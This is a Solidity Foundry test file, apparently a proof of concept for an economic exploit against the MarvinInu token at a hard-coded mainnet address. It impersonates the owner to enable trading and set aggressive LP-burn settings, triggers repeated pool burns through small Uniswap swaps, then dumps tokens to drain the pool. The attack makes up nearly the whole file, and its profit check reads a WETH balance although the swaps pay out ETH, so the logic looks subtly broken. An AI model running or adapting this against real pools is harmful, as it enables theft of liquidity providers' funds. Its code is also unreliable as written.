pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMarvinInu {
    function owner() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function enableTrading() external;
    function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external;
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function WETH() external pure returns (address);
}


contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    IMarvinInu marvin = IMarvinInu(TARGET);
    IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant originalOwner = 0x323198348B671a044e1350a418de163F36814b89;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(attacker, 100 ether);

        vm.startPrank(originalOwner);
        // Transfer 90% of total supply from owner to attacker
        marvin.transfer(attacker, marvin.balanceOf(originalOwner) * 9 / 10);
        vm.stopPrank();

        pair = marvin.uniswapV2Pair();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this));
        uint256 initialAttackerETHBalance = attacker.balance;

        // 1. As owner, enable trading and set aggressive LP burn settings
        vm.startPrank(originalOwner);
        marvin.enableTrading();
        marvin.setAutoLPBurnSettings(600, 1000, true); // 600 seconds, 10% burn
        vm.stopPrank();

        // 2. Attacker approves router to spend all their tokens
        marvin.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(marvin);
        path[1] = WETH;

        // 3. Repeatedly trigger the LP burn with small swaps
        // The burn is triggered on a sell (transfer to the pair)
        for (uint256 i = 0; i < 10; i++) {
            vm.warp(block.timestamp + 601); // Advance time past the frequency
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                1e18, // Small amount to trigger the burn
                0,
                path,
                address(this),
                block.timestamp
            );
        }

        // 4. Dump all tokens to drain the manipulated pool
        uint256 remainingBalance = marvin.balanceOf(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            remainingBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 finalBalance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

